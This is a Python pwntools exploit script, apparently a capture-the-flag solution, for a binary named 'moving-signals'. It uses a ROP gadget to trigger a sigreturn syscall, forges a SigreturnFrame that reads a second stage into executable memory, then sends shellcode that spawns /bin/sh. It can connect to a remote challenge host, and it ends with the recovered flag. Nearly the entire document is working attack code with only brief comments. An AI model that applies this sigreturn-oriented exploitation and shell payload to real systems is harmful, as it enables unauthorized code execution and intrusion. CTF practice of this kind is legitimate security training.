#!/usr/bin/env python
from pwn import *

# sigreturn didn't play nice in WSL
# used an Ubuntu 18.04 VM instead

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './moving-signals'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("185.172.165.118", 2525)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * 0x41017
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Hand-crafted shellcode performs a read syscall to stack
# for immediate program-counter control after a ret.
#   read(0, "aaaa\n", 500)
# We will trigger a sigreturn syscall to pop args from the stack 

io = start()

#padding = b"aaaabbbb"
padding = b"/bin/sh\x00"
payload = padding
payload += p64(0x041018) # pop rax; ret
payload += p64(15) # rax # sigreturn syscall code
"""
At this point,
rax = 0x142
rdi = 0x00
rsi = ptr => "/bin/sh\x00"
rdx = 0x1f4 # we need this to be 0x00
rcx = 0x00
r8 = 0x00
"""
payload += p64(0x41015) # syscall; ret

frame = SigreturnFrame(kernel="amd64")
frame.rax = 0x00 # read
frame.rdi = 0x00 # stdin
frame.rsi = 0x41110 # buf - rwx code section beginning of .shellcode
frame.rdx = 0x100 # read_size # max read is 3824 otherwise out-of-bounds
frame.rsp = 0x41110 # 
frame.rip = 0x41015 # syscall ; ret

payload += bytes(frame)

io.sendline(payload)

shellcode = asm(shellcraft.amd64.linux.sh())
stage2 = p64(0x41118) # shellcode addr
stage2 += shellcode
io.sendline(stage2)

io.interactive()

# flag{s1gROPp1ty_r0p_321321}

